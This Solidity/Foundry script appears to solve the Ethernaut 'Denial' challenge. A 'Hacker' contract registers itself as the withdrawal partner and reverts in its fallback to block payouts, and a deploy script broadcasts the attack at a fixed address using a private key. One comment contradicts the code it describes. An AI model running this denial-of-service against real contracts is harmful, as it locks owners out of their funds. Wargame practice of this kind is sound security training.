// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";

contract Denial {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        (bool success, ) = partner.call{value:amountToSend}("");
        require(success, "Transfer failed.");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Hacker {
    constructor(Denial _denial) {
        _denial.setWithdrawPartner(address(this));
    }

    fallback() external payable {
        assembly {
            // revert the transaction
            invalid()
        }
    }
}


contract DeployScript is Script {
    function setUp() public view {}

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        Denial denial = Denial(payable(0x1eE7b37f08bb33E381d940C6024a4245eC1b9fEe));
        new Hacker(denial);
        denial.withdraw();
        vm.stopBroadcast();
    }
}